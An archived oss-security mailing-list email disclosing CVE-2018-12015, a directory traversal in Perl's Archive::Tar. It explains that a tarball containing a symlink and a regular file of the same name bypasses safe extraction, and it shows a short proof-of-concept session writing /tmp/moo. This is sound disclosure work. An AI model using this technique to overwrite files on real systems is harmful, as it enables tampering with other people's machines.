X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1185" "Thursday" "7" "June" "2018" "20:41:25" "+0200" "Salvatore Bonaccorso" "carnil@debian.org" "<20180607184125.GA16629@eldamar.local>" "36" "[oss-security] Perl: CVE-2018-12015: Archive::Tar: directory traversal vulnerability" nil nil nil "6" "2018060718:41:25" "[oss-security] Perl: CVE-2018-12015: Archive::Tar: directory traversal vulnerability" (number mark "U       carnil@debia Jun  7   36/1185  " thread-indent "\"[oss-security] Perl: CVE-2018-12015: Archive::Tar: directory traversal vulnerability\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 11777 invoked by uid 550); 7 Jun 2018 18:41:39 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 11728 invoked from network); 7 Jun 2018 18:41:38 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=sender:date:from:to:subject:message-id:mime-version
         :content-disposition:user-agent;
        bh=Ujz94QImVu6hOxTVoNWwiic8MIOGAnMeCLdETEebSAg=;
        b=eKC1p8nBfRdIsU2qXg0iphPnLIisXMTzPDGGNgibNOMRb+jbBNeIcAZ18z0M+HWlz/
         09jHXXwuflg4XTxr2DGcfdGx0EEmVLXfTJrHxEp6RlX3JrU4tkMzQMYXOpDK+Oy1c3UA
         O3fxLB45o5OTvvryjLjCH+5GFkKJAWNsYz0v4WFdRIzsefjkGb0Cs82PebF7hVTjv7GY
         EiwpOOTTq/aR9V4EBSGmkRSkQ5XBAZz4+UuTg+hD32Js6g/4k2u/ou9FP1oyQmcQXQhd
         OOHQr4+IT7pQOBdS4KyTUG2UwynHv8kXtJptW8vKDUPP+R+JaSVjWy7pkr7vZAAhbUfE
         6B9A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:sender:date:from:to:subject:message-id
         :mime-version:content-disposition:user-agent;
        bh=Ujz94QImVu6hOxTVoNWwiic8MIOGAnMeCLdETEebSAg=;
        b=HKeQU1vgndCJ7ALR3MRtdrpY/iQcewyLsjj58T24EnqmaN9GaOgkn1UV6Zgoh3O5k5
         GxGVrRhks2JEJ43DdBubYJS0EFwZDmmf+NkGVgbBoh5dw6CqjHM6niDWF1ljfAlI3lx2
         +Y/+Rplgi87t+j+JqsmRAdlj+wRwXfpdH7y1M7pS7tjF6dUAAAhOwD/ZucPKplbjXxPm
         MxNi2ClYl0sjPdKQbNLwBW+fkA2czEwDO3awGv0/jxKzg2ljCLndX1XIkt+DUJXIfqVf
         3NoEBHhs5K/Y23tfovRilo16DopVMaxVQHZxOqyI7/dnb/pcuHDtprQ8XfLScxfT/9+A
         dNRA==
X-Gm-Message-State: APt69E2ojsMGCNGHz09nFUO4KCjYv4Fnl2SQDNC4mGRUP8rXx5MhjXS/
	d78o1lH1hDst0WX7J2rUfI3h6A==
X-Google-Smtp-Source: ADUXVKKnEO2Dt9TEznQc9y0yXetOwY+lNDPcUf6MNTKsppgeNbXgLifgstk+OXLGRQMxmxhqvF5vUQ==
X-Received: by 2002:adf:eace:: with SMTP id o14-v6mr2418805wrn.150.1528396886941;
        Thu, 07 Jun 2018 11:41:26 -0700 (PDT)
Sender: Salvatore Bonaccorso <salvatore.bonaccorso@gmail.com>
Date: Thu, 7 Jun 2018 20:41:25 +0200
From: Salvatore Bonaccorso <carnil@debian.org>
To: OSS Security Mailinglist <oss-security@lists.openwall.com>
Message-ID: <20180607184125.GA16629@eldamar.local>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
User-Agent: Mutt/1.10.0 (2018-05-17)
Subject: [oss-security] Perl: CVE-2018-12015: Archive::Tar: directory traversal vulnerability

Hi

The following dirctory traversal vulnerability was reporte to the
Debian bugtracker at https://bugs.debian.org/900834 , which got
assigned CVE-2018-12015 by MITRE (requested via the
http://cveform.mitre.org/):

> By default, the Archive::Tar module doesn't allow extracting files
> outside the current working directory. However, you can bypass this
> secure extraction mode easily by putting a symlink and a regular file
> with the same name into the tarball.
> 
> I've attached proof of concept tarball, which makes Archive::Tar create
> /tmp/moo, regardless of what the current working directory is:
> 
>   $ tar -tvvf traversal.tar.gz
>   lrwxrwxrwx root/root         0 2018-06-05 18:55 moo -> /tmp/moo
>   -rw-r--r-- root/root         4 2018-06-05 18:55 moo
> 
>   $ pwd
>   /home/jwilk
> 
>   $ ls /tmp/moo
>   ls: cannot access '/tmp/moo': No such file or directory
> 
>   $ perl -MArchive::Tar -e 'Archive::Tar->extract_archive("traversal.tar.gz")'
> 
>   $ ls /tmp/moo
>   /tmp/moo

The mentioned proof of concept tarball is attached to the Debian bug at
https://bugs.debian.org/cgi-bin/bugreport.cgi?att=1;bug=900834;filename=traversal.tar.gz;msg=3
.

Regards,
Salvatore
